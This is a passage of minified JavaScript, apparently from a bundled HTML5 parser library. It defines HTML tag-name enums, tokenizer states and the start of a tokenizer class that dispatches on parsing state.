AGE="image",e.INPUT="input",e.IFRAME="iframe",e.KEYGEN="keygen",e.LABEL="label",e.LI="li",e.LINK="link",e.LISTING="listing",e.MAIN="main",e.MALIGNMARK="malignmark",e.MARQUEE="marquee",e.MATH="math",e.MENU="menu",e.META="meta",e.MGLYPH="mglyph",e.MI="mi",e.MO="mo",e.MN="mn",e.MS="ms",e.MTEXT="mtext",e.NAV="nav",e.NOBR="nobr",e.NOFRAMES="noframes",e.NOEMBED="noembed",e.NOSCRIPT="noscript",e.OBJECT="object",e.OL="ol",e.OPTGROUP="optgroup",e.OPTION="option",e.P="p",e.PARAM="param",e.PLAINTEXT="plaintext",e.PRE="pre",e.RB="rb",e.RP="rp",e.RT="rt",e.RTC="rtc",e.RUBY="ruby",e.S="s",e.SCRIPT="script",e.SEARCH="search",e.SECTION="section",e.SELECT="select",e.SOURCE="source",e.SMALL="small",e.SPAN="span",e.STRIKE="strike",e.STRONG="strong",e.STYLE="style",e.SUB="sub",e.SUMMARY="summary",e.SUP="sup",e.TABLE="table",e.TBODY="tbody",e.TEMPLATE="template",e.TEXTAREA="textarea",e.TFOOT="tfoot",e.TD="td",e.TH="th",e.THEAD="thead",e.TITLE="title",e.TR="tr",e.TRACK="track",e.TT="tt",e.U="u",e.UL="ul",e.SVG="svg",e.VAR="var",e.WBR="wbr",e.XMP="xmp"})(ce||(ce={}));var v;(function(e){e[e.UNKNOWN=0]="UNKNOWN",e[e.A=1]="A",e[e.ADDRESS=2]="ADDRESS",e[e.ANNOTATION_XML=3]="ANNOTATION_XML",e[e.APPLET=4]="APPLET",e[e.AREA=5]="AREA",e[e.ARTICLE=6]="ARTICLE",e[e.ASIDE=7]="ASIDE",e[e.B=8]="B",e[e.BASE=9]="BASE",e[e.BASEFONT=10]="BASEFONT",e[e.BGSOUND=11]="BGSOUND",e[e.BIG=12]="BIG",e[e.BLOCKQUOTE=13]="BLOCKQUOTE",e[e.BODY=14]="BODY",e[e.BR=15]="BR",e[e.BUTTON=16]="BUTTON",e[e.CAPTION=17]="CAPTION",e[e.CENTER=18]="CENTER",e[e.CODE=19]="CODE",e[e.COL=20]="COL",e[e.COLGROUP=21]="COLGROUP",e[e.DD=22]="DD",e[e.DESC=23]="DESC",e[e.DETAILS=24]="DETAILS",e[e.DIALOG=25]="DIALOG",e[e.DIR=26]="DIR",e[e.DIV=27]="DIV",e[e.DL=28]="DL",e[e.DT=29]="DT",e[e.EM=30]="EM",e[e.EMBED=31]="EMBED",e[e.FIELDSET=32]="FIELDSET",e[e.FIGCAPTION=33]="FIGCAPTION",e[e.FIGURE=34]="FIGURE",e[e.FONT=35]="FONT",e[e.FOOTER=36]="FOOTER",e[e.FOREIGN_OBJECT=37]="FOREIGN_OBJECT",e[e.FORM=38]="FORM",e[e.FRAME=39]="FRAME",e[e.FRAMESET=40]="FRAMESET",e[e.H1=41]="H1",e[e.H2=42]="H2",e[e.H3=43]="H3",e[e.H4=44]="H4",e[e.H5=45]="H5",e[e.H6=46]="H6",e[e.HEAD=47]="HEAD",e[e.HEADER=48]="HEADER",e[e.HGROUP=49]="HGROUP",e[e.HR=50]="HR",e[e.HTML=51]="HTML",e[e.I=52]="I",e[e.IMG=53]="IMG",e[e.IMAGE=54]="IMAGE",e[e.INPUT=55]="INPUT",e[e.IFRAME=56]="IFRAME",e[e.KEYGEN=57]="KEYGEN",e[e.LABEL=58]="LABEL",e[e.LI=59]="LI",e[e.LINK=60]="LINK",e[e.LISTING=61]="LISTING",e[e.MAIN=62]="MAIN",e[e.MALIGNMARK=63]="MALIGNMARK",e[e.MARQUEE=64]="MARQUEE",e[e.MATH=65]="MATH",e[e.MENU=66]="MENU",e[e.META=67]="META",e[e.MGLYPH=68]="MGLYPH",e[e.MI=69]="MI",e[e.MO=70]="MO",e[e.MN=71]="MN",e[e.MS=72]="MS",e[e.MTEXT=73]="MTEXT",e[e.NAV=74]="NAV",e[e.NOBR=75]="NOBR",e[e.NOFRAMES=76]="NOFRAMES",e[e.NOEMBED=77]="NOEMBED",e[e.NOSCRIPT=78]="NOSCRIPT",e[e.OBJECT=79]="OBJECT",e[e.OL=80]="OL",e[e.OPTGROUP=81]="OPTGROUP",e[e.OPTION=82]="OPTION",e[e.P=83]="P",e[e.PARAM=84]="PARAM",e[e.PLAINTEXT=85]="PLAINTEXT",e[e.PRE=86]="PRE",e[e.RB=87]="RB",e[e.RP=88]="RP",e[e.RT=89]="RT",e[e.RTC=90]="RTC",e[e.RUBY=91]="RUBY",e[e.S=92]="S",e[e.SCRIPT=93]="SCRIPT",e[e.SEARCH=94]="SEARCH",e[e.SECTION=95]="SECTION",e[e.SELECT=96]="SELECT",e[e.SOURCE=97]="SOURCE",e[e.SMALL=98]="SMALL",e[e.SPAN=99]="SPAN",e[e.STRIKE=100]="STRIKE",e[e.STRONG=101]="STRONG",e[e.STYLE=102]="STYLE",e[e.SUB=103]="SUB",e[e.SUMMARY=104]="SUMMARY",e[e.SUP=105]="SUP",e[e.TABLE=106]="TABLE",e[e.TBODY=107]="TBODY",e[e.TEMPLATE=108]="TEMPLATE",e[e.TEXTAREA=109]="TEXTAREA",e[e.TFOOT=110]="TFOOT",e[e.TD=111]="TD",e[e.TH=112]="TH",e[e.THEAD=113]="THEAD",e[e.TITLE=114]="TITLE",e[e.TR=115]="TR",e[e.TRACK=116]="TRACK",e[e.TT=117]="TT",e[e.U=118]="U",e[e.UL=119]="UL",e[e.SVG=120]="SVG",e[e.VAR=121]="VAR",e[e.WBR=122]="WBR",e[e.XMP=123]="XMP"})(v||(v={}));const eM=new Map([[ce.A,v.A],[ce.ADDRESS,v.ADDRESS],[ce.ANNOTATION_XML,v.ANNOTATION_XML],[ce.APPLET,v.APPLET],[ce.AREA,v.AREA],[ce.ARTICLE,v.ARTICLE],[ce.ASIDE,v.ASIDE],[ce.B,v.B],[ce.BASE,v.BASE],[ce.BASEFONT,v.BASEFONT],[ce.BGSOUND,v.BGSOUND],[ce.BIG,v.BIG],[ce.BLOCKQUOTE,v.BLOCKQUOTE],[ce.BODY,v.BODY],[ce.BR,v.BR],[ce.BUTTON,v.BUTTON],[ce.CAPTION,v.CAPTION],[ce.CENTER,v.CENTER],[ce.CODE,v.CODE],[ce.COL,v.COL],[ce.COLGROUP,v.COLGROUP],[ce.DD,v.DD],[ce.DESC,v.DESC],[ce.DETAILS,v.DETAILS],[ce.DIALOG,v.DIALOG],[ce.DIR,v.DIR],[ce.DIV,v.DIV],[ce.DL,v.DL],[ce.DT,v.DT],[ce.EM,v.EM],[ce.EMBED,v.EMBED],[ce.FIELDSET,v.FIELDSET],[ce.FIGCAPTION,v.FIGCAPTION],[ce.FIGURE,v.FIGURE],[ce.FONT,v.FONT],[ce.FOOTER,v.FOOTER],[ce.FOREIGN_OBJECT,v.FOREIGN_OBJECT],[ce.FORM,v.FORM],[ce.FRAME,v.FRAME],[ce.FRAMESET,v.FRAMESET],[ce.H1,v.H1],[ce.H2,v.H2],[ce.H3,v.H3],[ce.H4,v.H4],[ce.H5,v.H5],[ce.H6,v.H6],[ce.HEAD,v.HEAD],[ce.HEADER,v.HEADER],[ce.HGROUP,v.HGROUP],[ce.HR,v.HR],[ce.HTML,v.HTML],[ce.I,v.I],[ce.IMG,v.IMG],[ce.IMAGE,v.IMAGE],[ce.INPUT,v.INPUT],[ce.IFRAME,v.IFRAME],[ce.KEYGEN,v.KEYGEN],[ce.LABEL,v.LABEL],[ce.LI,v.LI],[ce.LINK,v.LINK],[ce.LISTING,v.LISTING],[ce.MAIN,v.MAIN],[ce.MALIGNMARK,v.MALIGNMARK],[ce.MARQUEE,v.MARQUEE],[ce.MATH,v.MATH],[ce.MENU,v.MENU],[ce.META,v.META],[ce.MGLYPH,v.MGLYPH],[ce.MI,v.MI],[ce.MO,v.MO],[ce.MN,v.MN],[ce.MS,v.MS],[ce.MTEXT,v.MTEXT],[ce.NAV,v.NAV],[ce.NOBR,v.NOBR],[ce.NOFRAMES,v.NOFRAMES],[ce.NOEMBED,v.NOEMBED],[ce.NOSCRIPT,v.NOSCRIPT],[ce.OBJECT,v.OBJECT],[ce.OL,v.OL],[ce.OPTGROUP,v.OPTGROUP],[ce.OPTION,v.OPTION],[ce.P,v.P],[ce.PARAM,v.PARAM],[ce.PLAINTEXT,v.PLAINTEXT],[ce.PRE,v.PRE],[ce.RB,v.RB],[ce.RP,v.RP],[ce.RT,v.RT],[ce.RTC,v.RTC],[ce.RUBY,v.RUBY],[ce.S,v.S],[ce.SCRIPT,v.SCRIPT],[ce.SEARCH,v.SEARCH],[ce.SECTION,v.SECTION],[ce.SELECT,v.SELECT],[ce.SOURCE,v.SOURCE],[ce.SMALL,v.SMALL],[ce.SPAN,v.SPAN],[ce.STRIKE,v.STRIKE],[ce.STRONG,v.STRONG],[ce.STYLE,v.STYLE],[ce.SUB,v.SUB],[ce.SUMMARY,v.SUMMARY],[ce.SUP,v.SUP],[ce.TABLE,v.TABLE],[ce.TBODY,v.TBODY],[ce.TEMPLATE,v.TEMPLATE],[ce.TEXTAREA,v.TEXTAREA],[ce.TFOOT,v.TFOOT],[ce.TD,v.TD],[ce.TH,v.TH],[ce.THEAD,v.THEAD],[ce.TITLE,v.TITLE],[ce.TR,v.TR],[ce.TRACK,v.TRACK],[ce.TT,v.TT],[ce.U,v.U],[ce.UL,v.UL],[ce.SVG,v.SVG],[ce.VAR,v.VAR],[ce.WBR,v.WBR],[ce.XMP,v.XMP]]);function Yl(e){var t;return(t=eM.get(e))!==null&&t!==void 0?t:v.UNKNOWN}const Te=v,tM={[be.HTML]:new Set([Te.ADDRESS,Te.APPLET,Te.AREA,Te.ARTICLE,Te.ASIDE,Te.BASE,Te.BASEFONT,Te.BGSOUND,Te.BLOCKQUOTE,Te.BODY,Te.BR,Te.BUTTON,Te.CAPTION,Te.CENTER,Te.COL,Te.COLGROUP,Te.DD,Te.DETAILS,Te.DIR,Te.DIV,Te.DL,Te.DT,Te.EMBED,Te.FIELDSET,Te.FIGCAPTION,Te.FIGURE,Te.FOOTER,Te.FORM,Te.FRAME,Te.FRAMESET,Te.H1,Te.H2,Te.H3,Te.H4,Te.H5,Te.H6,Te.HEAD,Te.HEADER,Te.HGROUP,Te.HR,Te.HTML,Te.IFRAME,Te.IMG,Te.INPUT,Te.LI,Te.LINK,Te.LISTING,Te.MAIN,Te.MARQUEE,Te.MENU,Te.META,Te.NAV,Te.NOEMBED,Te.NOFRAMES,Te.NOSCRIPT,Te.OBJECT,Te.OL,Te.P,Te.PARAM,Te.PLAINTEXT,Te.PRE,Te.SCRIPT,Te.SECTION,Te.SELECT,Te.SOURCE,Te.STYLE,Te.SUMMARY,Te.TABLE,Te.TBODY,Te.TD,Te.TEMPLATE,Te.TEXTAREA,Te.TFOOT,Te.TH,Te.THEAD,Te.TITLE,Te.TR,Te.TRACK,Te.UL,Te.WBR,Te.XMP]),[be.MATHML]:new Set([Te.MI,Te.MO,Te.MN,Te.MS,Te.MTEXT,Te.ANNOTATION_XML]),[be.SVG]:new Set([Te.TITLE,Te.FOREIGN_OBJECT,Te.DESC]),[be.XLINK]:new Set,[be.XML]:new Set,[be.XMLNS]:new Set},B0=new Set([Te.H1,Te.H2,Te.H3,Te.H4,Te.H5,Te.H6]);ce.STYLE,ce.SCRIPT,ce.XMP,ce.IFRAME,ce.NOEMBED,ce.NOFRAMES,ce.PLAINTEXT;var V;(function(e){e[e.DATA=0]="DATA",e[e.RCDATA=1]="RCDATA",e[e.RAWTEXT=2]="RAWTEXT",e[e.SCRIPT_DATA=3]="SCRIPT_DATA",e[e.PLAINTEXT=4]="PLAINTEXT",e[e.TAG_OPEN=5]="TAG_OPEN",e[e.END_TAG_OPEN=6]="END_TAG_OPEN",e[e.TAG_NAME=7]="TAG_NAME",e[e.RCDATA_LESS_THAN_SIGN=8]="RCDATA_LESS_THAN_SIGN",e[e.RCDATA_END_TAG_OPEN=9]="RCDATA_END_TAG_OPEN",e[e.RCDATA_END_TAG_NAME=10]="RCDATA_END_TAG_NAME",e[e.RAWTEXT_LESS_THAN_SIGN=11]="RAWTEXT_LESS_THAN_SIGN",e[e.RAWTEXT_END_TAG_OPEN=12]="RAWTEXT_END_TAG_OPEN",e[e.RAWTEXT_END_TAG_NAME=13]="RAWTEXT_END_TAG_NAME",e[e.SCRIPT_DATA_LESS_THAN_SIGN=14]="SCRIPT_DATA_LESS_THAN_SIGN",e[e.SCRIPT_DATA_END_TAG_OPEN=15]="SCRIPT_DATA_END_TAG_OPEN",e[e.SCRIPT_DATA_END_TAG_NAME=16]="SCRIPT_DATA_END_TAG_NAME",e[e.SCRIPT_DATA_ESCAPE_START=17]="SCRIPT_DATA_ESCAPE_START",e[e.SCRIPT_DATA_ESCAPE_START_DASH=18]="SCRIPT_DATA_ESCAPE_START_DASH",e[e.SCRIPT_DATA_ESCAPED=19]="SCRIPT_DATA_ESCAPED",e[e.SCRIPT_DATA_ESCAPED_DASH=20]="SCRIPT_DATA_ESCAPED_DASH",e[e.SCRIPT_DATA_ESCAPED_DASH_DASH=21]="SCRIPT_DATA_ESCAPED_DASH_DASH",e[e.SCRIPT_DATA_ESCAPED_LESS_THAN_SIGN=22]="SCRIPT_DATA_ESCAPED_LESS_THAN_SIGN",e[e.SCRIPT_DATA_ESCAPED_END_TAG_OPEN=23]="SCRIPT_DATA_ESCAPED_END_TAG_OPEN",e[e.SCRIPT_DATA_ESCAPED_END_TAG_NAME=24]="SCRIPT_DATA_ESCAPED_END_TAG_NAME",e[e.SCRIPT_DATA_DOUBLE_ESCAPE_START=25]="SCRIPT_DATA_DOUBLE_ESCAPE_START",e[e.SCRIPT_DATA_DOUBLE_ESCAPED=26]="SCRIPT_DATA_DOUBLE_ESCAPED",e[e.SCRIPT_DATA_DOUBLE_ESCAPED_DASH=27]="SCRIPT_DATA_DOUBLE_ESCAPED_DASH",e[e.SCRIPT_DATA_DOUBLE_ESCAPED_DASH_DASH=28]="SCRIPT_DATA_DOUBLE_ESCAPED_DASH_DASH",e[e.SCRIPT_DATA_DOUBLE_ESCAPED_LESS_THAN_SIGN=29]="SCRIPT_DATA_DOUBLE_ESCAPED_LESS_THAN_SIGN",e[e.SCRIPT_DATA_DOUBLE_ESCAPE_END=30]="SCRIPT_DATA_DOUBLE_ESCAPE_END",e[e.BEFORE_ATTRIBUTE_NAME=31]="BEFORE_ATTRIBUTE_NAME",e[e.ATTRIBUTE_NAME=32]="ATTRIBUTE_NAME",e[e.AFTER_ATTRIBUTE_NAME=33]="AFTER_ATTRIBUTE_NAME",e[e.BEFORE_ATTRIBUTE_VALUE=34]="BEFORE_ATTRIBUTE_VALUE",e[e.ATTRIBUTE_VALUE_DOUBLE_QUOTED=35]="ATTRIBUTE_VALUE_DOUBLE_QUOTED",e[e.ATTRIBUTE_VALUE_SINGLE_QUOTED=36]="ATTRIBUTE_VALUE_SINGLE_QUOTED",e[e.ATTRIBUTE_VALUE_UNQUOTED=37]="ATTRIBUTE_VALUE_UNQUOTED",e[e.AFTER_ATTRIBUTE_VALUE_QUOTED=38]="AFTER_ATTRIBUTE_VALUE_QUOTED",e[e.SELF_CLOSING_START_TAG=39]="SELF_CLOSING_START_TAG",e[e.BOGUS_COMMENT=40]="BOGUS_COMMENT",e[e.MARKUP_DECLARATION_OPEN=41]="MARKUP_DECLARATION_OPEN",e[e.COMMENT_START=42]="COMMENT_START",e[e.COMMENT_START_DASH=43]="COMMENT_START_DASH",e[e.COMMENT=44]="COMMENT",e[e.COMMENT_LESS_THAN_SIGN=45]="COMMENT_LESS_THAN_SIGN",e[e.COMMENT_LESS_THAN_SIGN_BANG=46]="COMMENT_LESS_THAN_SIGN_BANG",e[e.COMMENT_LESS_THAN_SIGN_BANG_DASH=47]="COMMENT_LESS_THAN_SIGN_BANG_DASH",e[e.COMMENT_LESS_THAN_SIGN_BANG_DASH_DASH=48]="COMMENT_LESS_THAN_SIGN_BANG_DASH_DASH",e[e.COMMENT_END_DASH=49]="COMMENT_END_DASH",e[e.COMMENT_END=50]="COMMENT_END",e[e.COMMENT_END_BANG=51]="COMMENT_END_BANG",e[e.DOCTYPE=52]="DOCTYPE",e[e.BEFORE_DOCTYPE_NAME=53]="BEFORE_DOCTYPE_NAME",e[e.DOCTYPE_NAME=54]="DOCTYPE_NAME",e[e.AFTER_DOCTYPE_NAME=55]="AFTER_DOCTYPE_NAME",e[e.AFTER_DOCTYPE_PUBLIC_KEYWORD=56]="AFTER_DOCTYPE_PUBLIC_KEYWORD",e[e.BEFORE_DOCTYPE_PUBLIC_IDENTIFIER=57]="BEFORE_DOCTYPE_PUBLIC_IDENTIFIER",e[e.DOCTYPE_PUBLIC_IDENTIFIER_DOUBLE_QUOTED=58]="DOCTYPE_PUBLIC_IDENTIFIER_DOUBLE_QUOTED",e[e.DOCTYPE_PUBLIC_IDENTIFIER_SINGLE_QUOTED=59]="DOCTYPE_PUBLIC_IDENTIFIER_SINGLE_QUOTED",e[e.AFTER_DOCTYPE_PUBLIC_IDENTIFIER=60]="AFTER_DOCTYPE_PUBLIC_IDENTIFIER",e[e.BETWEEN_DOCTYPE_PUBLIC_AND_SYSTEM_IDENTIFIERS=61]="BETWEEN_DOCTYPE_PUBLIC_AND_SYSTEM_IDENTIFIERS",e[e.AFTER_DOCTYPE_SYSTEM_KEYWORD=62]="AFTER_DOCTYPE_SYSTEM_KEYWORD",e[e.BEFORE_DOCTYPE_SYSTEM_IDENTIFIER=63]="BEFORE_DOCTYPE_SYSTEM_IDENTIFIER",e[e.DOCTYPE_SYSTEM_IDENTIFIER_DOUBLE_QUOTED=64]="DOCTYPE_SYSTEM_IDENTIFIER_DOUBLE_QUOTED",e[e.DOCTYPE_SYSTEM_IDENTIFIER_SINGLE_QUOTED=65]="DOCTYPE_SYSTEM_IDENTIFIER_SINGLE_QUOTED",e[e.AFTER_DOCTYPE_SYSTEM_IDENTIFIER=66]="AFTER_DOCTYPE_SYSTEM_IDENTIFIER",e[e.BOGUS_DOCTYPE=67]="BOGUS_DOCTYPE",e[e.CDATA_SECTION=68]="CDATA_SECTION",e[e.CDATA_SECTION_BRACKET=69]="CDATA_SECTION_BRACKET",e[e.CDATA_SECTION_END=70]="CDATA_SECTION_END",e[e.CHARACTER_REFERENCE=71]="CHARACTER_REFERENCE",e[e.AMBIGUOUS_AMPERSAND=72]="AMBIGUOUS_AMPERSAND"})(V||(V={}));const tn={DATA:V.DATA,RCDATA:V.RCDATA,RAWTEXT:V.RAWTEXT,SCRIPT_DATA:V.SCRIPT_DATA,PLAINTEXT:V.PLAINTEXT,CDATA_SECTION:V.CDATA_SECTION};function nM(e){return e>=z.DIGIT_0&&e<=z.DIGIT_9}function Yo(e){return e>=z.LATIN_CAPITAL_A&&e<=z.LATIN_CAPITAL_Z}function rM(e){return e>=z.LATIN_SMALL_A&&e<=z.LATIN_SMALL_Z}function la(e){return rM(e)||Yo(e)}function d2(e){return la(e)||nM(e)}function fd(e){return e+32}function oC(e){return e===z.SPACE||e===z.LINE_FEED||e===z.TABULATION||e===z.FORM_FEED}function f2(e){return oC(e)||e===z.SOLIDUS||e===z.GREATER_THAN_SIGN}function iM(e){return e===z.NULL?he.nullCharacterReference:e>1114111?he.characterReferenceOutsideUnicodeRange:iC(e)?he.surrogateCharacterReference:sC(e)?he.noncharacterCharacterReference:aC(e)||e===z.CARRIAGE_RETURN?he.controlCharacterReference:null}class aM{constructor(t,n){this.options=t,this.handler=n,this.paused=!1,this.inLoop=!1,this.inForeignNode=!1,this.lastStartTagName="",this.active=!1,this.state=V.DATA,this.returnState=V.DATA,this.entityStartPos=0,this.consumedAfterSnapshot=-1,this.currentCharacterToken=null,this.currentToken=null,this.currentAttr={name:"",value:""},this.preprocessor=new qF(n),this.currentLocation=this.getCurrentLocation(-1),this.entityDecoder=new ZF($F,(r,a)=>{this.preprocessor.pos=this.entityStartPos+a-1,this._flushCodePointConsumedAsCharacterReference(r)},n.onParseError?{missingSemicolonAfterCharacterReference:()=>{this._err(he.missingSemicolonAfterCharacterReference,1)},absenceOfDigitsInNumericCharacterReference:r=>{this._err(he.absenceOfDigitsInNumericCharacterReference,this.entityStartPos-this.preprocessor.pos+r)},validateNumericCharacterReference:r=>{const a=iM(r);a&&this._err(a,1)}}:void 0)}_err(t,n=0){var r,a;(a=(r=this.handler).onParseError)===null||a===void 0||a.call(r,this.preprocessor.getError(t,n))}getCurrentLocation(t){return this.options.sourceCodeLocationInfo?{startLine:this.preprocessor.line,startCol:this.preprocessor.col-t,startOffset:this.preprocessor.offset-t,endLine:-1,endCol:-1,endOffset:-1}:null}_runParsingLoop(){if(!this.inLoop){for(this.inLoop=!0;this.active&&!this.paused;){this.consumedAfterSnapshot=0;const t=this._consume();this._ensureHibernation()||this._callState(t)}this.inLoop=!1}}pause(){this.paused=!0}resume(t){if(!this.paused)throw new Error("Parser was already resumed");this.paused=!1,!this.inLoop&&(this._runParsingLoop(),this.paused||t==null||t())}write(t,n,r){this.active=!0,this.preprocessor.write(t,n),this._runParsingLoop(),this.paused||r==null||r()}insertHtmlAtCurrentPos(t){this.active=!0,this.preprocessor.insertHtmlAtCurrentPos(t),this._runParsingLoop()}_ensureHibernation(){return this.preprocessor.endOfChunkHit?(this.preprocessor.retreat(this.consumedAfterSnapshot),this.consumedAfterSnapshot=0,this.active=!1,!0):!1}_consume(){return this.consumedAfterSnapshot++,this.preprocessor.advance()}_advanceBy(t){this.consumedAfterSnapshot+=t;for(let n=0;n<t;n++)this.preprocessor.advance()}_consumeSequenceIfMatch(t,n){return this.preprocessor.startsWith(t,n)?(this._advanceBy(t.length-1),!0):!1}_createStartTagToken(){this.currentToken={type:ot.START_TAG,tagName:"",tagID:v.UNKNOWN,selfClosing:!1,ackSelfClosing:!1,attrs:[],location:this.getCurrentLocation(1)}}_createEndTagToken(){this.currentToken={type:ot.END_TAG,tagName:"",tagID:v.UNKNOWN,selfClosing:!1,ackSelfClosing:!1,attrs:[],location:this.getCurrentLocation(2)}}_createCommentToken(t){this.currentToken={type:ot.COMMENT,data:"",location:this.getCurrentLocation(t)}}_createDoctypeToken(t){this.currentToken={type:ot.DOCTYPE,name:t,forceQuirks:!1,publicId:null,systemId:null,location:this.currentLocation}}_createCharacterToken(t,n){this.currentCharacterToken={type:t,chars:n,location:this.currentLocation}}_createAttr(t){this.currentAttr={name:t,value:""},this.currentLocation=this.getCurrentLocation(0)}_leaveAttrName(){var t,n;const r=this.currentToken;if(lC(r,this.currentAttr.name)===null){if(r.attrs.push(this.currentAttr),r.location&&this.currentLocation){const a=(t=(n=r.location).attrs)!==null&&t!==void 0?t:n.attrs=Object.create(null);a[this.currentAttr.name]=this.currentLocation,this._leaveAttrValue()}}else this._err(he.duplicateAttribute)}_leaveAttrValue(){this.currentLocation&&(this.currentLocation.endLine=this.preprocessor.line,this.currentLocation.endCol=this.preprocessor.col,this.currentLocation.endOffset=this.preprocessor.offset)}prepareToken(t){this._emitCurrentCharacterToken(t.location),this.currentToken=null,t.location&&(t.location.endLine=this.preprocessor.line,t.location.endCol=this.preprocessor.col+1,t.location.endOffset=this.preprocessor.offset+1),this.currentLocation=this.getCurrentLocation(-1)}emitCurrentTagToken(){const t=this.currentToken;this.prepareToken(t),t.tagID=Yl(t.tagName),t.type===ot.START_TAG?(this.lastStartTagName=t.tagName,this.handler.onStartTag(t)):(t.attrs.length>0&&this._err(he.endTagWithAttributes),t.selfClosing&&this._err(he.endTagWithTrailingSolidus),this.handler.onEndTag(t)),this.preprocessor.dropParsedChunk()}emitCurrentComment(t){this.prepareToken(t),this.handler.onComment(t),this.preprocessor.dropParsedChunk()}emitCurrentDoctype(t){this.prepareToken(t),this.handler.onDoctype(t),this.preprocessor.dropParsedChunk()}_emitCurrentCharacterToken(t){if(this.currentCharacterToken){switch(t&&this.currentCharacterToken.location&&(this.currentCharacterToken.location.endLine=t.startLine,this.currentCharacterToken.location.endCol=t.startCol,this.currentCharacterToken.location.endOffset=t.startOffset),this.currentCharacterToken.type){case ot.CHARACTER:{this.handler.onCharacter(this.currentCharacterToken);break}case ot.NULL_CHARACTER:{this.handler.onNullCharacter(this.currentCharacterToken);break}case ot.WHITESPACE_CHARACTER:{this.handler.onWhitespaceCharacter(this.currentCharacterToken);break}}this.currentCharacterToken=null}}_emitEOFToken(){const t=this.getCurrentLocation(0);t&&(t.endLine=t.startLine,t.endCol=t.startCol,t.endOffset=t.startOffset),this._emitCurrentCharacterToken(t),this.handler.onEof({type:ot.EOF,location:t}),this.active=!1}_appendCharToCurrentCharacterToken(t,n){if(this.currentCharacterToken)if(this.currentCharacterToken.type===t){this.currentCharacterToken.chars+=n;return}else this.currentLocation=this.getCurrentLocation(0),this._emitCurrentCharacterToken(this.currentLocation),this.preprocessor.dropParsedChunk();this._createCharacterToken(t,n)}_emitCodePoint(t){const n=oC(t)?ot.WHITESPACE_CHARACTER:t===z.NULL?ot.NULL_CHARACTER:ot.CHARACTER;this._appendCharToCurrentCharacterToken(n,String.fromCodePoint(t))}_emitChars(t){this._appendCharToCurrentCharacterToken(ot.CHARACTER,t)}_startCharacterReference(){this.returnState=this.state,this.state=V.CHARACTER_REFERENCE,this.entityStartPos=this.preprocessor.pos,this.entityDecoder.startEntity(this._isCharacterReferenceInAttribute()?Si.Attribute:Si.Legacy)}_isCharacterReferenceInAttribute(){return this.returnState===V.ATTRIBUTE_VALUE_DOUBLE_QUOTED||this.returnState===V.ATTRIBUTE_VALUE_SINGLE_QUOTED||this.returnState===V.ATTRIBUTE_VALUE_UNQUOTED}_flushCodePointConsumedAsCharacterReference(t){this._isCharacterReferenceInAttribute()?this.currentAttr.value+=String.fromCodePoint(t):this._emitCodePoint(t)}_callState(t){switch(this.state){case V.DATA:{this._stateData(t);break}case V.RCDATA:{this._stateRcdata(t);break}case V.RAWTEXT:{this._stateRawtext(t);break}case V.SCRIPT_DATA:{this._stateScriptData(t);break}case V.PLAINTEXT:{this._statePlaintext(t);break}case V.TAG_OPEN:{this._stateTagOpen(t);break}case V.END_TAG_OPEN:{this._stateEndTagOpen(t);break}case V.TAG_NAME:{this._stateTagName(t);break}case V.RCDATA_LESS_THAN_SIGN:{this._stateRcdataLessThanSign(t);break}case V.RCDATA_END_TAG_OPEN:{this._stateRcdataEndTagOpen(t);break}case V.RCDATA_END_TAG_NAME:{this._stateRcdataEndTagName(t);break}case V.RAWTEXT_LESS_THAN_SIGN:{this._stateRawtextLessThanSign(t);break}case V.RAWTEXT_END_TAG_OPEN:{this._stateRawtextEndTagOpen(t);break}case V.RAWTEXT_END_TAG_NAME:{this._stateRawtextEndTagName(t);break}case V.SCRIPT_DATA_LESS_THAN_SIGN:{this._stateScriptDataLessThanSign(t);break}case V.SCRIPT_DATA_END_TAG_OPEN:{this._stateScriptDataEndTagOpen(t);break}case V.SCRIPT_DATA_END_TAG_NAME:{this._stateScriptDataEndTagName(t);break}case V.SCRIPT_DATA_ESCAPE_START:{this._stateScriptDataEscapeStart(t);break}case V.SCRIPT_DATA_ESCAPE_START_DASH:{this._stateScriptDataEscapeStartDash(t);break}case V.SCRIPT_DATA_ESCAPED:{this._stateScriptDataEscaped(t);break}case V.SCRIPT_DATA_ESCAPED_DASH:{this._stateScriptDataEscapedDash(t);break}case V.SCRIPT_DATA_ESCAPED_DASH_DASH:{this._stateScriptDataEscapedDashDash(t);break}case V.SCRIPT_DATA_ESCAPED_LESS_THAN_SIGN:{this._stateScriptDataEscapedLessThanSign(t);break}case V.SCRIPT_DATA_ESCAPED_END_TAG_OPEN:{this._stateScriptDataEscapedEndTagOpen(t);break}case V.SCRIPT_DATA_ESCAPED_END_TAG_NAME:{this._stateScriptDataEscapedEndTagName(t);break}case V.SCRIPT_DATA_DOUBLE_ESCAPE_START:{this._stateScriptDataDoubleEscapeStart(t);break}case V.SCRIPT_DATA_DOUBLE_ESCAPED:{this._stateScriptDataDoubleEscaped(t);break}case V.SCRIPT_DATA_DOUBLE_ESCAPED_DASH:{this._stateScriptDataDoubleEscapedDash(t);break}case V.SCRIPT_DATA_DOUBLE_ESCAPED_DASH_DASH:{this._stateScriptDataDoubleEscapedDashDash(t);break}case V.SCRIPT_DATA_DOUBLE_ESCAPED_LESS_THAN_SIGN:{this._stateScriptDataDoubleEscapedLessThanSign(t);break}case V.SCRIPT_DATA_DOUBLE_ESCAPE_END:{this._stateScriptDataDoubleEscapeEnd(t);break}case V.BEFORE_ATTRIBUTE_NAME:{this._stateBeforeAttributeName(t);break}case V.ATTRIBUTE_NAME:{this._stateAttributeName(t);break}case V.AFTER_ATTRIBUTE_NAME:{this._stateAfterAttributeName(t);break}case V.BEFORE_ATTRIBUTE_VALUE:{this._stateBeforeAttributeValue(t);break}case V.ATTRIBUTE_VALUE_DOUBLE_QUOTED:{this._stateAttributeValueDoubleQuoted(t);break}case V.ATTRIBUTE_VALUE_SINGLE_QUOTED:{this._stateAttributeValueSingleQuoted(t);break}case V.ATTRIBUTE_VALUE_UNQUOTED:{this._stateAttributeValueUnquoted(t);break}case V.AFTER_ATTRIBUTE_VALUE_QUOTED:{this._stateAfterAttributeValueQuoted(t);break}case V.SELF_CLOSING_START_TAG:{this._stateSelfClosingStartTag(t);break}case V.BOGUS_COMMENT:{this._stateBogusComment(t);break}case V.MARKUP_DECLARATION_OPEN:{this._stateMarkupDeclarationOpen(t);break}case V.COMMENT_START:{this._stateCommentStart(t);break}case V.COMMENT_START_DASH:{this._stateCommentStartDash(t);break}case V.COMMENT:{this._stateComment(t);break}case V.COMMENT_LESS_THAN_SIGN:{this._stateCommentLessThanSign(t);break}case V.COMMENT_LESS_THAN_SIGN_BANG:{this._stateCommentLessThanSignBang(t);break}case 